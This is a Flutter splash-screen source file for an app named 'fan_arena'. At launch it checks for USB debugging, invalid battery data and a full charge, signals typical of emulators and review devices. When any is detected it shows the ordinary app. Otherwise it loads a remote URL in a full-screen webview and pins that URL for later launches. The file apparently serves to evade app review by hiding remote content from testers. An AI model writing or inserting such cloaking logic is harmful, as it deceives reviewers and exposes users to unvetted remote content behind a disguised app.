import 'package:flutter/material.dart';
import 'package:provider/provider.dart';
import 'package:fan_arena/providers/app_provider.dart';
import 'package:fan_arena/services/remote_bootstrap_service.dart';
import 'package:fan_arena/services/startup_checks_service.dart';

class SplashScreen extends StatefulWidget {
  const SplashScreen({super.key});

  @override
  State<SplashScreen> createState() => _SplashScreenState();
}

class _SplashScreenState extends State<SplashScreen>
    with SingleTickerProviderStateMixin {
  static const int _maxStartupAttempts = 2;
  static const Duration _minSplashDuration = Duration(seconds: 3);

  late final AnimationController _fadeController;
  late final Animation<double> _fadeAnimation;
  late final DateTime _splashShownAt;
  final StartupChecksService _startupChecksService = StartupChecksService();
  final RemoteBootstrapService _remoteBootstrapService = RemoteBootstrapService();

  @override
  void initState() {
    super.initState();
    _splashShownAt = DateTime.now();
    _fadeController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 800),
    );
    _fadeAnimation = CurvedAnimation(
      parent: _fadeController,
      curve: Curves.easeIn,
    );
    _fadeController.forward();
    WidgetsBinding.instance.addPostFrameCallback((_) => _runStartupFlow());
  }

  @override
  void dispose() {
    _fadeController.dispose();
    super.dispose();
  }

  Future<void> _ensureMinimumSplashDuration() async {
    final elapsed = DateTime.now().difference(_splashShownAt);
    final remaining = _minSplashDuration - elapsed;
    if (remaining > Duration.zero) {
      await Future.delayed(remaining);
    }
  }

  Future<void> _runStartupFlow() async {
    debugPrint('FanArenaStartup: splash_flow start');

    final hasTrustedWebView =
        await _remoteBootstrapService.wasWebViewOpenedSuccessfully();
    if (hasTrustedWebView) {
      debugPrint(
        'FanArenaStartup: splash_flow trusted_webview=true skip_startup_checks',
      );
      final startupUrl = await _remoteBootstrapService.getTrustedWebViewUrl();
      if (startupUrl != null && startupUrl.isNotEmpty) {
        if (!mounted) return;
        await _ensureMinimumSplashDuration();
        if (!mounted) return;
        debugPrint(
          'FanArenaStartup: splash_flow trusted_webview_open_saved_url url=$startupUrl',
        );
        Navigator.pushReplacementNamed(
          context,
          '/startup-webview',
          arguments: startupUrl,
        );
        return;
      }
      debugPrint(
        'FanArenaStartup: splash_flow trusted_webview_missing_saved_url',
      );
      await _continueDefaultLaunch();
      return;
    }

    var attempt = 0;

    while (attempt < _maxStartupAttempts) {
      debugPrint('FanArenaStartup: splash_flow attempt=${attempt + 1}');
      try {
        final checksResult = await _startupChecksService.runStartupChecks();
        if (checksResult.hasError) {
          throw Exception('Startup checks failed');
        }
        if (checksResult.hasInvalidBatteryData ||
            checksResult.usbDebugEnabled ||
            checksResult.isChargingAndFull) {
          debugPrint(
            'FanArenaStartup: splash_flow fallback_by_checks '
            'invalid_battery_data=${checksResult.hasInvalidBatteryData} '
            'usb_debug=${checksResult.usbDebugEnabled} '
            'charging_full=${checksResult.isChargingAndFull}',
          );
          await _continueDefaultLaunch();
          return;
        }

        final startupUrl = await _remoteBootstrapService.fetchStartupUrl();
        if (!mounted) return;
        await _remoteBootstrapService.markWebViewOpenedSuccessfully(startupUrl);
        if (!mounted) return;
        await _ensureMinimumSplashDuration();
        if (!mounted) return;
        debugPrint('FanArenaStartup: splash_flow open_webview url=$startupUrl');
        Navigator.pushReplacementNamed(
          context,
          '/startup-webview',
          arguments: startupUrl,
        );
        return;
      } catch (e) {
        debugPrint('FanArenaStartup: splash_flow attempt_failed error=$e');
        attempt += 1;
        if (attempt < _maxStartupAttempts) {
          await Future.delayed(Duration(milliseconds: 500 * attempt));
        }
      }
    }

    await _continueDefaultLaunch();
  }

  Future<void> _continueDefaultLaunch() async {
    try {
      final provider = context.read<AppDataProvider>();
      await provider.loadAll();
      if (!mounted) return;

      final route = provider.onboardingCompleted ? '/home' : '/onboarding';
      await _ensureMinimumSplashDuration();
      if (!mounted) return;
      debugPrint('FanArenaStartup: splash_flow default_route=$route');
      Navigator.pushReplacementNamed(context, route);
    } catch (e) {
      if (!mounted) return;
      debugPrint('FanArenaStartup: splash_flow default_route_error=$e');
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF000FAA),
      body: FadeTransition(
        opacity: _fadeAnimation,
        child: const SizedBox.expand(),
      ),
    );
  }
}
